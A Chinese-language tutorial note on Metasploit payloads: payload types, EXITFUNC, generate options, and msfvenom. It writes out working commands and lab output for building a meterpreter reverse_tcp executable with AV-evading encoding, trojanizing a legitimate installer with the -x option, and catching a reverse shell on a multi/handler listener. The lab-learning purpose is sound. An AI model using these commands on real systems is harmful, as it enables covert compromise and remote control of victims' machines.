# Metasploit payload

https://www.fujieace.com/metasploit/payloads.html

## 概述

payload 又称为攻击载荷，主要时用来建立目标机于攻击机稳定连接的，可返回shell，也可以进行程序注入。也有人把payloads称为shellcode

> Shellcode实际是一段代码（也可以是填充数据），是用来发送到服务器利用特定漏洞的代码，一般可以获取权限。另外，Shellcode一般是作为数据发送给受攻击服务器的。

## payload分类

1. singles：独立载荷，可直接植入目标系统并执行相应的程序，如：shell_bind_tcp这个payload。

2. stagers：传输器载荷，用于目标机与攻击机之间建立稳定的网络连接，与传输体载荷配合攻击。通常该种载荷体积都非常小，可以在漏洞利用后方便注入，这类载荷功能都非常相似，大致分为bind型和reverse型，==bind型是需要攻击机主动连接目标端口的；而reverse型是目标机会反连接攻击机，需要提前设定好连接攻击机的ip地址和端口号。==

3. stages：传输体载荷，如shell，meterpreter等。在stagers建立好稳定的连接后，攻击机将stages传输给目标机，由stagers进行相应处理，将控制权转交给stages。比如得到目标机的shell，或者meterpreter控制程序运行。这样攻击机可以在本端输入相应命令控制目标机。

> 这里我理解为stager是建立传输的通道，而stage是将攻击机输入的命令，且stage本身有段落的意思

<img src="..\..\..\imgs\_Kali\metasploit\Snipaste_2020-09-09_23-25-02.png"/>

   > 由此可见，msf中的meterpreter其实就是一个payload，它需要stagers和相应的stages配合运行，meterpreter是运行在内存中的，通过注入dll文件实现，在目标机硬盘上不会留下文件痕迹，所以在被入侵时很难找到。正是因为这点，所以meterpreter非常可靠、稳定、优秀。

5. PassiveX：PassiveX也是一个Payload（有效载荷），可以帮助规避限制性出站防火墙。它通过使用ActiveX控件来创建Internet Explorer的隐藏实例。使用新的ActiveX控件，它通过HTTP请求和响应与攻击者进行通信。

6. NoNX：NX（No eXecute）位是内置于某些CPU中的功能，用于防止代码在某些内存区域执行。在Windows中，NX被实现为数据执行保护（DEP）。Metasploit NoNX Payloads（有效载荷）旨在规避DEP。

7. Ord：Ord Payloads是基于Windows stager的有效载荷，具有明显的优点和缺点。它的优点是可以追溯到Windows 9x的每一种风格和语言，而不需要明确定义返回地址。他们也非常小。然而，两个非常具体的缺点使他们不是默认选择。首先是它依赖于ws2_32.dll在被利用之前被加载的事实。第二个是它比其他stagers不太稳定。

8. IPv6：正如名称所示，Metasploit IPv6 Payloads（有效载荷）构建于IPv6网络上。

9. Reflective DLL injection（反射性DLL注入）：反射式DLL注入是一种技术，将stage payload注入到运行在内存中的受损主机进程中，从不接触主机硬盘。VNC和Meterpreter Payload（有效载荷）都使用反射式DLL注入。

## EXITFUNC

参考：

https://www.hacking-tutorial.com/tips-and-trick/what-is-metasploit-exitfunc/#sthash.dcj2uEAE.dpbs

This **EXITFUNC** option effectively sets a function **hash** in the payload that specifies a **DLL** and function to ==call when the payload is complete.==

There are 4 different values for **EXITFUNC** : none, seh, thread and process. Usually it is set to thread or process, which corresponds to the ExitThread or ExitProcess calls. "none" technique will calls GetLastError, effectively a no-op. The thread will then continue executing, allowing you to simply cat multiple payloads together to be run in serial.

**EXITFUNC** will be **useful** in some cases where after you **exploited** a box, you need a clean exit, even unfortunately the biggest problem is that many payloads don’t have a clean execution path after the exitfunc 🙂 .

| **SEH**     | This method should be used when there is a structured exception handler (**SEH**) that will restart the thread or process automatically when an error occurs. |
| ----------- | ------------------------------------------------------------ |
| **THREAD**  | This method is used in most exploitation scenarios where the **exploited** process (e.g. IE) runs the shellcode in a sub-thread and exiting this thread results in a working application/system (clean exit) |
| **PROCESS** | This method should be used with multi/handler. This method should also be used with any exploit where a master process restarts it on exit. |

## 生成payload

当你使用某个payload时, 可以使用payload的命令

<img src="..\..\..\imgs\_Kali\metasploit\Snipaste_2020-09-10_08-57-32.png"/>

`generate`命令以当前模块生成一个paylaod, 具体请查看`generate -h`

<img src="..\..\..\imgs\_Kali\metasploit\Snipaste_2020-09-10_08-58-59.png"/>

当前没有任何tweeking这样生成的shellcode的几率时相当低的。通常会根据目标机器使用错误的字符和特定类型的编码器。

#### 避免坏字符

使用参数 `-b`来避免一些坏字符（不会再buf中出现），msf会根据特定的坏字符使用特定的encoder

> 这里的 \x00 == 0x00 对应空字符

<img src="..\..\..\imgs\_Kali\metasploit\Snipaste_2020-09-10_09-05-08.png"/>

<img src="..\..\..\imgs\_Kali\metasploit\Snipaste_2020-09-10_09-07-19.png"/>

具有不使用某些字符而生成shellcode的能力是该框架提供的重要功能之一。这并不意味着它是无限的。如果给出的限制字符太多，则没有encoder可用于该任务。

<img src="..\..\..\imgs\_Kali\metasploit\Snipaste_2020-09-10_09-14-47.png"/>

这就像删除字母表中的字母，并要求默认写出完整的句子。有时它不能完成 。

#### 编码器

当生成我们的有效载荷时，msf会选择最佳的编码器，但是有时候需要使用特定的类型，无论Metasploit认为什么。通过`show encoders`查看具体的编码器。

使用 参数`-e`来指定编码器，这里的攻击载荷将使用大写字母。

<img src="..\..\..\imgs\_Kali\metasploit\Snipaste_2020-09-10_09-24-07.png"/>

> 注意的时，在使用默认值以外的其他编码器，我们必须小心。因为它倾向于给我们一个更大的有效载荷。

#### 格式

使用参数`-f`以指定载荷的格式，在特定的操作系统可以运行。或是特定的高级语言写的。

<img src="..\..\..\imgs\_Kali\metasploit\Snipaste_2020-09-10_09-39-00.png"/>

<img src="..\..\..\imgs\_Kali\metasploit\Snipaste_2020-09-10_09-44-44.png"/>

通过`file`命令查看生成的文件

<img src="..\..\..\imgs\_Kali\metasploit\Snipaste_2020-09-10_09-51-23.png"/>

#### 保存

使用参数`-o`将载荷保存到指定位置

<img src="..\..\..\imgs\_Kali\metasploit\Snipaste_2020-09-10_09-47-50.png"/>

#### 迭代

使用参数`-i`指定编码的迭代次数，它告诉框架在生成最终有效载荷之前必须执行多少次编码。这样做的原因是隐形或反病毒检测。

<img src="..\..\..\imgs\_Kali\metasploit\Snipaste_2020-09-10_09-50-45.png"/>

## 案例

1. 选定载荷，设置相关参数

   ```
   msf5 exploit(multi/handler) > use payload/windows/meterpreter/reverse_tcp
   msf5 payload(windows/meterpreter/reverse_tcp) > show options 
   
   Module options (payload/windows/meterpreter/reverse_tcp):
   
      Name      Current Setting  Required  Description
      ----      ---------------  --------  -----------
      EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
      LHOST     192.168.80.200   yes       The listen address (an interface may be specified)
      LPORT     4444             yes       The listen port
   
   ```

2. 生成载荷, `-x`参数将指定文件挂上木马

   ```
   msf5 payload(windows/meterpreter/reverse_tcp) > generate -h
   Usage: generate [options]
   
   Generates a payload. Datastore options may be supplied after normal options.
   
   Example: generate -f python LHOST=127.0.0.1
   
   OPTIONS:
   
       -E        Force encoding
       -O <opt>  Deprecated: alias for the '-o' option
       -P <opt>  Total desired payload size, auto-produce appropriate NOP sled length
       -S <opt>  The new section name to use when generating (large) Windows binaries
       -b <opt>  The list of characters to avoid example: '\x00\xff'
       -e <opt>  The encoder to use
       -f <opt>  Output format: base32,base64,bash,c,csharp,dw,dword,hex,java,js_be,js_le,num,perl,pl,powershell,ps1,py,python,raw,rb,ruby,sh,vbapplication,vbscript,asp,aspx,aspx-exe,axis2,dll,elf,elf-so,exe,exe-only,exe-service,exe-small,hta-psh,jar,jsp,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-cmd,psh-net,psh-reflection,python-reflection,vba,vba-exe,vba-psh,vbs,war
       -h        Show this message
       -i <opt>  The number of times to encode the payload
       -k        Preserve the template behavior and inject the payload as a new thread
       -n <opt>  Prepend a nopsled of [length] size on to the payload
       -o <opt>  The output file name (otherwise stdout)
       -p <opt>  The platform of the payload
       -v        Verbose output (display stage in addition to stager)
       -x <opt>  Specify a custom executable file to use as a template
   msf5 payload(windows/meterpreter/reverse_tcp) > generate -i 10 -f exe -o /var/www/html/tt.exe
   
   ```

3. 使用通用exploit模块(`exploit/multi/handler`)，并设置相关参数，开启监听

   ```
   msf5 payload(windows/meterpreter/reverse_tcp) > use exploit/multi/handler 
   [*] Using configured payload windows/meterpreter/reverse_tcp
   msf5 exploit(multi/handler) > show options 
   
   Module options (exploit/multi/handler):
   
      Name  Current Setting  Required  Description
      ----  ---------------  --------  -----------
   
   
   Payload options (windows/meterpreter/reverse_tcp):
   
      Name      Current Setting  Required  Description
      ----      ---------------  --------  -----------
      EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
      LHOST     192.168.80.200   yes       The listen address (an interface may be specified)
      LPORT     4444             yes       The listen port
   
   
   Exploit target:
   
      Id  Name
      --  ----
      0   Wildcard Target
   
   
   msf5 exploit(multi/handler) > run
   
   [*] Started reverse TCP handler on 192.168.80.200:4444 
   ```

4. 目标机访问下载文件并运行，反弹shell到攻击机

   > 反弹shell的目录为木马所在的文件位置

   ```
   msf5 exploit(multi/handler) > run
   
   [*] Started reverse TCP handler on 192.168.80.200:4444 
   [*] Sending stage (176195 bytes) to 192.168.80.129
   [*] Meterpreter session 2 opened (192.168.80.200:4444 -> 192.168.80.129:49295) at 2020-09-21 06:13:29 -0400
   
   meterpreter > ls
   Listing: C:\Users\John\Downloads
   ================================
   
   Mode              Size   Type  Last modified              Name
   ----              ----   ----  -------------              ----
   100666/rw-rw-rw-  940    fil   2020-09-12 22:54:57 -0400  cacert.der
   100666/rw-rw-rw-  282    fil   2020-09-06 00:37:28 -0400  desktop.ini
   100777/rwxrwxrwx  73802  fil   2020-09-21 06:02:23 -0400  t.exe
   100777/rwxrwxrwx  73802  fil   2020-09-21 06:13:07 -0400  tt.exe
   
   meterpreter > 
   ```

## msfvenom

msfvenom是payload和encoder两个模块的组合

> 使用-x 参数可以指定将当前木马挂到指定文件, 会有一定几率导致文件无法运行，session失效。可能是软件有防挂载。

```
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -x /root/Desktop/mingw-w64-install.exe -b '\x00' -i 3 -f exe -o /var/www/html/mingw.exe
```

监听

```
msf5 payload(windows/x64/meterpreter/reverse_tcp) > use exploit/multi/handler 
[*] Using configured payload windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > show options 

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.80.200   yes       The listen address (an interface may be specified)
   LPORT     666              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.80.200:4444 
```





